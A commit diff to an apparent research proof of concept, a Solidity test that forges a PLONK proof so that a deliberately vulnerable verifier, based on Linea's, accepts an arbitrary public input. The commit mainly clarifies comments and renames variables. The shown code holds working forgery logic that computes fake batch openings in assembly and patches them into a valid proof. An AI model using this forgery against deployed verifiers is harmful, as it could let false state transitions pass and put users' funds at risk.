f3a34761bf3f8a41179e77537fcc2a055d6708f3
0xmp <0xmpostersyndrome@gmail.com>
2024-02-29 10:20:54 -0500

    Last Challenge Attack POC: Update comments to be clearer.

--- papers/the-last-challenge-attack/proof-of-concept/LastChallengeAttack.t.sol
+++ papers/the-last-challenge-attack/proof-of-concept/LastChallengeAttack.t.sol
@@ -28,9 +28,9 @@ contract LastChallengeAttack is Test {
     function setUp() public {
         plonkVerifier = new VulnerablePlonkVerifier();
         
-        // Valid proof from which some elements will be replaced
+        // Valid proof from which some elements will be replaced. This proof was taken from [Linea's test suite](https://github.com/Consensys/linea-contracts-fix/blob/2056d470143f66196184fd55b27f1240d5f74ef9/test/testData/Full/output-file.json#L2).
         proof = hex"23821aca8b8a72a2a672434960684640782865bde1d2a6e9f238a2b9cf4c16e203fd6a2b35336aaabc373367d14ec67e82460e9eb2008699f7e055f43b3718132179526db856e99b57ab0d38e1d69439e399ac5bbdf766c36c756575f8dc34c618f3606f7f79487c8bc55a1817eb4b04c679d241b9f98b86ab6364fe6d00318e08017a7a933de03ee950f3fbe5840004d2ce7f9c48d667ecebaad9cd4cc4f47f14924655d581db624b02f3fa1b2022c53c23dfff612eaa4458a38f23bb5a58da125dbaa7b4053189f3c800c28641288b0a7c75d04591c99a1b0666b27db7518d18ff1d42273551e0edc1d73369aa420e83ee905ba1446022c7a75b82973497222a111728c313484f6a2f726950af07850216a09b912c94085d2da660646c5f4908b8927c36ba13dc60ae28d071e9c604fadb66dbaf4979cc447e074c328f278e1cfc649e531783b23c2f469d1e90d58888fe9bb3b65b806f2632eb5aca2f43e716d734fdb03ba8867997c478c5cb72418643a1bb4eeae181c4692dc77b01882f007adb191885268d29282ba206121ba54ec5ff1281195b1aa3894e2bfa3ca084173105c58f474d672ad59b39e1e601e9651627a778417a6f1dcfe7c8342211f221361a8ed2f748f7788e749dfa67d7131af40f2d5fbb4a35c01067b59c82e0740bc73c321863e4cb34122de56506d1b90baa3227776b92f788edb61f0d828a2317db3fd6ad6a6bd30425a86c0c4f80b64b21fd695511bc612f8bdc479adfa92314f52136bde78a5adec621ad9b61ec7920e18de55d068989259fefa8d55dc97d1e37120849dbbc4440b81e335b897e977349cf0e055ce36495132be24bfe45da1db587822115120fc15572ce3e0723e1d90abc940a873bb83c4d64a481f331d8075f452867978605a93b282ad4e5a94b339e5203070d192ab7dac31312048cba13c44edfea3fc4ec9b958d855b6a3a494f1c5b1832678fce81856aed4265b27627c2d582bd3c8ce87212cefb03893db38388030fca44cdbb4d43c98c2d731633241ff322819cb59e9b36c09eeb9a8f043c76db4a7b924a288c137d6b8ce2a0592c69548a780e32eff92812c87b1ea92777050064fdd83ca7f832d61ccec422002567d8e41b950cd07c211ba711f1022a799f4277af8bb4ddff625d5cacc6c00210540550aa0aaf3a4bf4d27d528814d0673b6a9cf0614562a5cb020a2aeb8b281dcccfb2a3c8a85652cb4cd96db617c001edf3fde0b79489ac8712fbefa7c7f8214459c97cdddc6ef1ea85cb7bc587c309983fa4c7b8c5dc410ee3a27f1c4d6b";
-        // Public input
+        // Public input. This public input was taken from [Linea's test suite](https://github.com/Consensys/linea-contracts-fix/blob/2056d470143f66196184fd55b27f1240d5f74ef9/test/testData/Full/output-file.json#L306).
         stateTransitionHash = hex"3041a1027bacc392df45fe2e0a35293974440621ecf1efca11e5359819869829";
     }
 
@@ -44,16 +44,24 @@ contract LastChallengeAttack is Test {
     }
 
      function test_ForgeProof() external returns (bool) {
-        // We forge a proof for the following falsified input: 
-        uint256 falsifiedInput = uint256(bytes32(keccak256(abi.encodePacked("RANDOM_INPUT_SELECTED_BY_THE_PROVER")))) % r_mod;
+        // We forge a proof for the following arbitrary input: 
+        uint256 arbitraryInput = uint256(bytes32(keccak256(abi.encodePacked("RANDOM_INPUT_SELECTED_BY_THE_PROVER")))) % r_mod;
         
-        console2.log("Changing the public input from %s to %s", uint256(bytes32(stateTransitionHash)), falsifiedInput);
+        console2.log("Changing the public input from %s to %s", uint256(bytes32(stateTransitionHash)), arbitraryInput);
         uint256[] memory public_inputs = new uint256[](1);
-        public_inputs[0] = falsifiedInput; // Adding our falsified public input to the input array.
+        public_inputs[0] = arbitraryInput; // Adding our arbitrary public input to the input array.
 
-        // A and B were extracted from a valid proof and simply need to pass the pairing check. 
-        // They are constant elliptic curve points respecting e(-A, [x]2) * e(B, [1]2) == 1.
-        // They do not need to be changed. 
+        // When changing the public input as done above, we also need to recompute some elements
+        // of the proof (e.g. commitments). Which elements should be changed are commented below. 
+        // To change them after modifying the public input, uncomment the associated lines in `VulnerablePlonkVerifier.sol`.
+        // Then run `forge test --match-test test_ForgeProof -vvv`, which is going to revert with a custom error. 
+        // The elements should be changed to their associated value returned in the custom error. The error is effectively
+        // used as a way to "print" elements from assembly code, as it doesn't support `console.log` or other logging functions.
+
+        // A and B are constant elliptic curve points respecting e(-A, [x]2) * e(B, [1]2) == 1. 
+        // They can for example be extracted by using a custom error at the end of `VulnerablePlonkVerifier.sol` to extract the 
+        // curve points, and running the test for a valid proof. They are called `folded_digests` and `folded_quotients` lines 786-793.
+        // They DO NOT need to be changed. 
         uint256 A_x = uint256(bytes32(hex"2025b8d1546cb26b11c553e5de1c32b51157c50f0704b57d3b7ce9207c389000"));
         uint256 A_y = uint256(bytes32(hex"1ba9b9e7da413178cfe16b60ea0168ff19d49185139a1efc7259b5571d31725e"));
         uint256 B_x = uint256(bytes32(hex"25ea7385449dab9f1da965dccd945aca3d13457aa37a90ad7733b1e2c3e4447c"));
@@ -86,10 +94,10 @@ contract LastChallengeAttack is Test {
         // They are computed later as `X = [Wz]1 = (-u)*Y + A` and `Y = [Wzω]1 = 1/(zu(ω - 1)) * (C + B -zA)`.
         {
             console2.log("Solving the equations to find the batch openings [Wz]1 = X and [Wzw]1 = Y.");
-            uint256 x_x; 
-            uint256 x_y;
-            uint256 y_x;
-            uint256 y_y;
+            uint256 X_x; 
+            uint256 X_y;
+            uint256 Y_x;
+            uint256 Y_y;
 
             assembly {
                 function pow(x, e, mPtr) -> res { // Function returning x ** e % r for 32 bytes integer by calling `modexp` precompile
@@ -136,17 +144,17 @@ contract LastChallengeAttack is Test {
                 }
 
                 mstore(add(mPtr, 0x40), den) // 1 / (z*u*(w-1))
-                l_success := staticcall(gas(), 7, mPtr, 0x60, mPtr, 0x40) // Computes y = 1 / (z*u*(w-1)) * (C + B -zA) and stores it to mPtr
+                l_success := staticcall(gas(), 7, mPtr, 0x60, mPtr, 0x40) // Computes Y = 1 / (z*u*(w-1)) * (C + B -zA) and stores it to mPtr
                 if iszero(l_success) {
                     revert(0,0)
                 }
 
-                y_x := mload(mPtr) // `Y = [Wzω]1 = 1/(zu(ω - 1)) * (C + B -zA)`
-                y_y := mload(add(mPtr, 0x20))
+                Y_x := mload(mPtr) // `Y = [Wzω]1 = 1/(zu(ω - 1)) * (C + B -zA)`
+                Y_y := mload(add(mPtr, 0x20))
 
                 den := addmod(0, sub(r_mod, u), r_mod) // den = -u % r
-                mstore(mPtr, y_x) // x coordinate of C
-                mstore(add(mPtr, 0x20), y_y) // y coordinate of C
+                mstore(mPtr, Y_x) // x coordinate of C
+                mstore(add(mPtr, 0x20), Y_y) // y coordinate of C
                 mstore(add(mPtr, 0x40), den) // (-u)
                 l_success := staticcall(gas(), 7, mPtr, 0x60, mPtr, 0x40) // Computes (-u) * y and stores it to mPtr
                 if iszero(l_success) {
@@ -155,31 +163,31 @@ contract LastChallengeAttack is Test {
 
                 mstore(add(mPtr, 0x40), A_x) // Store A to be able to compute A - uy
                 mstore(add(mPtr, 0x60), A_y)
-                l_success := staticcall(gas(), 6, mPtr, 0x80, mPtr, 0x40) // Stores A - uy (x, y) coordinates to mPtr
+                l_success := staticcall(gas(), 6, mPtr, 0x80, mPtr, 0x40) // Stores X = A - uy (x, y) coordinates to mPtr
                 if iszero(l_success) {
                     revert(0,0)
                 }
 
-                x_x := mload(mPtr) // X = [Wz]1 = (-u)*Y + A
-                x_y := mload(add(mPtr, 0x20))
+                X_x := mload(mPtr) // X = [Wz]1 = (-u)*Y + A
+                X_y := mload(add(mPtr, 0x20))
             }
 
             {
                 // Getting X and Y coordinates as bytes
-                bytes memory bytes_x_x = abi.encodePacked(x_x); 
-                bytes memory bytes_x_y = abi.encodePacked(x_y);
-                bytes memory bytes_y_x = abi.encodePacked(y_x);
-                bytes memory bytes_y_y = abi.encodePacked(y_y);
+                bytes memory bytes_X_x = abi.encodePacked(X_x); 
+                bytes memory bytes_X_y = abi.encodePacked(X_y);
+                bytes memory bytes_Y_x = abi.encodePacked(Y_x);
+                bytes memory bytes_Y_y = abi.encodePacked(Y_y);
 
                 console2.log("Falsifying the batch openings.");
 
                 // Looping over all the bytes.
                 // We forge the proof by setting `[Wz]1 = X` and `[Wzω]1 = Y`
                 for (uint i = 0; i < 32; i++) {
-                    proof[proof_batch_opening_at_zeta_x + i] = bytes1(bytes_x_x[i]); 
-                    proof[proof_batch_opening_at_zeta_y + i] = bytes1(bytes_x_y[i]);
-                    proof[proof_opening_at_zeta_omega_x + i] = bytes1(bytes_y_x[i]);
-                    proof[proof_opening_at_zeta_omega_y + i] = bytes1(bytes_y_y[i]);
+                    proof[proof_batch_opening_at_zeta_x + i] = bytes1(bytes_X_x[i]); 
+                    proof[proof_batch_opening_at_zeta_y + i] = bytes1(bytes_X_y[i]);
+                    proof[proof_opening_at_zeta_omega_x + i] = bytes1(bytes_Y_x[i]);
+                    proof[proof_opening_at_zeta_omega_y + i] = bytes1(bytes_Y_y[i]);
                 }
             }
         }
